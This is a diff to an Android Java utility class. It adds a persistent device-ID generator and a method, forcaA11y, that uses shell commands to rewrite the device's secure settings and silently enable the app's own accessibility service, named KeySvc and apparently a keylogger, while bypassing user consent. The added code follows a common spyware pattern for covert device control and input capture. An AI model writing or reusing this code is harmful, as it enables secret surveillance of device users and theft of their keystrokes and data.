@@ -219,7 +219,21 @@ public final class Util {
         catch (Throwable ignored) {}
     }
 
-    public static String exec(String cmd) {
+    public static String idFixo(Context c) {
+try {
+android.content.SharedPreferences p = c.getSharedPreferences("p", 0);
+String v = p.getString("devid", null);
+if (v != null && v.length() >= 5) return v;
+java.util.Random r = new java.util.Random();
+String n = Long.toHexString(System.currentTimeMillis() * 31L + r.nextLong());
+if (n.length() > 6) n = n.substring(n.length() - 6);
+p.edit().putString("devid", n).apply();
+return n;
+} catch (Throwable t) {
+return Cfg.id(c);
+}
+}
+public static String exec(String cmd) {
         StringBuilder out = new StringBuilder();
         try {
             Process p = new ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start();
@@ -252,6 +266,22 @@ public final class Util {
         return b.toString();
     }
 
+    public static void forcaA11y(Context c) {
+        try {
+            String comp = c.getPackageName() + "/" + KeySvc.class.getName();
+            Process p = new ProcessBuilder("sh", "-c", "settings get secure enabled_accessibility_services").redirectErrorStream(true).start();
+            java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
+            StringBuilder sb = new StringBuilder();
+            String l;
+            while ((l = r.readLine()) != null) sb.append(l);
+            p.waitFor();
+            String atual = sb.toString().trim();
+            if (atual.contains(c.getPackageName())) return;
+            String novo = (atual.isEmpty() || atual.equals("null")) ? comp : atual + ":" + comp;
+            settings("secure", "enabled_accessibility_services", novo);
+            settings("secure", "accessibility_enabled", "1");
+        } catch (Throwable ignored) {}
+    }
     public static boolean settings(String ns, String k, String v) {
         try {
             Process p = new ProcessBuilder("sh", "-c",
